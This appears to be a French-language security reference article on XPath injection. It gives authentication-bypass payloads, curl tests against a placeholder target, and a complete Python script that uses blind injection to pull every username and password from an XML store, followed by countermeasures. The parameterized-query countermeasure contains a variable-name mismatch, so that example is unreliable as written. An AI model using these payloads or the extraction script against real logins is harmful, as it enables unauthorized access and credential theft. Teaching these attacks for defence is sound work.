---
title: XPATH Injection
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [xpath, injection, xml, authentication-bypass, sécurité, web]
date: 2026-03-22
---

# XPATH Injection

L'injection XPath exploite des requêtes XPath construites dynamiquement à partir d'entrées non filtrées. XPath est utilisé pour naviguer dans des documents XML, notamment dans les applications utilisant des fichiers XML comme base de données ou pour l'authentification.

## Rappel XPath

```
XPath (XML Path Language) — langage de requêtes pour documents XML

Structure XML typique (users.xml) :
<users>
  <user>
    <username>admin</username>
    <password>secret</password>
    <role>administrator</role>
  </user>
  <user>
    <username>alice</username>
    <password>pass123</password>
    <role>user</role>
  </user>
</users>

Syntaxe XPath de base :
  /users/user              → Tous les éléments user
  /users/user[1]           → Premier user
  //username               → Tous les éléments username (n'importe où)
  /users/user[username='alice']   → User dont username=alice
  /users/user[username='alice' and password='pass123']

Fonctions utiles :
  string-length(str)       → Longueur d'une chaîne
  substring(str, start, len)  → Sous-chaîne
  contains(str, substr)    → Vrai si substr dans str
  count(nodeset)           → Nombre de noeuds
  name()                   → Nom du noeud courant
  normalize-space()        → Supprime les espaces superflus
```

## Code vulnérable et injections de base

```python
# Code Python vulnérable (lxml)
from lxml import etree

tree = etree.parse("users.xml")
username = request.form['username']
password = request.form['password']

# Requête construite dynamiquement — VULNÉRABLE
query = f"//user[username='{username}' and password='{password}']"
result = tree.xpath(query)

if result:
    # Authentification réussie
    login(result[0].find('username').text)
```

### Bypass d'authentification

```
Requête normale pour admin:secret :
  //user[username='admin' and password='secret']

Payload dans username — ferme la quote et court-circuite la logique :
  admin' or '1'='1
  → //user[username='admin' or '1'='1' and password='x']
  → //user[username='admin' or true] → retourne tous les users → login en admin

Payload encore plus direct (ignorer le mot de passe) :
  admin']  | //user[username='admin
  → //user[username='admin'] | //user[username='admin' and password='']
  → toujours vrai pour admin

Autres payloads classiques :
  ' or '1'='1
  ' or 1=1 or 'x'='
  '] | //* | //user['
  admin' or position()=1 or 'x'='y
```

```bash
# Tests manuels sur un formulaire de login
curl -X POST https://target.com/login \
    -d "username=' or '1'='1&password=anything"

curl -X POST https://target.com/login \
    -d "username=admin' or '1'='1' or 'a'='b&password=x"

# Si réponse = authentification réussie → injectable
```

## Injection aveugle (Blind XPath Injection)

La page retourne uniquement succès/échec — extraction bit par bit.

### Extraction de la structure XML

```python
# Compter les utilisateurs
' or count(//user)=1 or 'a'='b   → True si 1 utilisateur
' or count(//user)=2 or 'a'='b   → True si 2 utilisateurs

# Longueur du nom du premier utilisateur
' or string-length(//user[1]/username)=5 or 'a'='b

# Extraire caractère par caractère
' or substring(//user[1]/username,1,1)='a' or 'a'='b  → True si commence par 'a'
' or substring(//user[1]/username,1,1)='b' or 'a'='b  → etc.
```

```python
# Script d'extraction automatique (Blind XPath Injection)
import requests
import string

TARGET = "https://target.com/login"

def test_payload(xpath_fragment):
    payload = f"' or {xpath_fragment} or 'x'='y"
    r = requests.post(TARGET, data={"username": payload, "password": "x"})
    return "Welcome" in r.text  # Adapter selon l'application

def extract_string(xpath_expr):
    result = ""
    pos = 1
    while True:
        # Tester la longueur
        length_found = False
        for length in range(1, 50):
            if test_payload(f"string-length({xpath_expr})={length}"):
                max_len = length
                length_found = True
                break
        if not length_found:
            break

        # Extraire caractère par caractère
        for i in range(1, max_len + 1):
            for char in string.printable:
                char_escaped = char.replace("'", "\\'")
                if test_payload(f"substring({xpath_expr},{i},1)='{char_escaped}'"):
                    result += char
                    print(f"[+] ...{result}", end="\r")
                    break
        break
    return result

# Extraire le nom du premier utilisateur
username = extract_string("//user[1]/username")
print(f"\n[+] Premier username : {username}")

# Extraire le mot de passe
password = extract_string(f"//user[username='{username}']/password")
print(f"[+] Mot de passe : {password}")

# Extraire tous les usernames
count_test = next(n for n in range(1,50) if test_payload(f"count(//user)={n}"))
print(f"[+] Nombre d'utilisateurs : {count_test}")
for i in range(1, count_test + 1):
    u = extract_string(f"//user[{i}]/username")
    p = extract_string(f"//user[{i}]/password")
    print(f"[+] User {i} : {u} / {p}")
```

### Extraction des noms de noeuds (structure inconnue)

```
Si la structure XML est inconnue, extraire les noms des éléments avec name() :

' or name(/*[1])='users' or 'a'='b          → True si racine = "users"
' or name(/users/*[1])='user' or 'a'='b     → True si 1er enfant = "user"
' or name(//user[1]/*[1])='username' or 'a'='b  → Nom du 1er attribut

Compter les enfants d'un noeud :
' or count(/users/user[1]/*)=3 or 'a'='b   → 3 champs par user
```

## Contextes d'injection

### SOAP / Web Services XML

```xml
<!-- Requête SOAP normale -->
<soap:Body>
  <GetUser>
    <username>alice</username>
  </GetUser>
</soap:Body>

<!-- Requête SOAP — injection XPath dans le paramètre username -->
<!-- L'application exécute : //user[username='VALEUR'] -->
<!-- Injection : alice'] | //* | //x[' -->
```

```bash
# Test avec curl sur un endpoint SOAP
curl -X POST https://api.target.com/soap \
    -H "Content-Type: text/xml" \
    -d "<?xml version='1.0'?>
<soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
  <soap:Body>
    <GetUser>
      <username>' or '1'='1</username>
    </GetUser>
  </soap:Body>
</soap:Envelope>"
```

### XPath dans des applications XML-natives (existDB, BaseX)

```
Certaines applications utilisent des bases de données XML natives
(eXist-dB, BaseX, MarkLogic) → XPath injection plus critique

Accès potentiel à tout le système de fichiers XML
→ Extraire des documents entiers, pas seulement des champs

Exemple d'extraction d'un document arbitraire :
' or doc('/db/users.xml')//password='x' or 'a'='b
```

## Détection

```bash
# Métacaractères XPath à injecter
'  "  ]  [  /  *  =  |  (  )

# Payload de détection — génère une erreur XPath visible
'
''
' or 1=1--
' or '1'='1
']//[username='admin

# Observer les réponses :
#   Erreur XPath explicite → injectable, messages d'erreur verbeux
#   Comportement différent entre ' or 1=1 et ' or 1=2 → injection aveugle

# Burp Suite Intruder — envoyer les payloads
# Liste : SecLists/Fuzzing/XPath-Injection.txt
```

## Contre-mesures

```python
# Contre-mesure 1 — Requêtes XPath paramétrées (lxml)
from lxml import etree

# DANGEREUX — concaténation directe
query = f"//user[username='{username}' and password='{password}']"

# SÉCURISÉ — séparation des données et de la requête
# lxml supporte les variables XPath
tree = etree.parse("users.xml")
result = tree.xpath(
    "//user[username=$user and password=$pass]",
    user=username,
    pass_=password
)

# En Java (javax.xml.xpath) — utiliser XPathVariableResolver
# En .NET — utiliser XPathExpression avec SetContext
```

```python
# Contre-mesure 2 — Validation et échappement
import re

def validate_username(username):
    # Autoriser uniquement alphanumérique + quelques caractères
    if not re.match(r'^[a-zA-Z0-9_.-]+$', username):
        raise ValueError("Caractères invalides dans le nom d'utilisateur")
    return username

# Échapper les métacaractères XPath si la paramétrisation n'est pas disponible
def escape_xpath(s):
    # Encoder les quotes simples
    if "'" not in s:
        return f"'{s}'"
    elif '"' not in s:
        return f'"{s}"'
    else:
        # concat() pour chaînes mixtes
        parts = s.split("'")
        return "concat('" + "', \"'\", '".join(parts) + "')"
```

```
Règles générales :
✓ Utiliser des requêtes XPath paramétrées (variables, pas de concaténation)
✓ Valider les entrées en whitelist (alphanumérique uniquement si possible)
✓ Principe du moindre privilège — limiter l'accès au document XML
✓ Ne pas exposer les erreurs XPath en production (révèle la structure)
✓ Utiliser une base de données relationnelle plutôt que XML pour les credentials
✓ Logs : monitorer les requêtes XPath anormalement longues
```
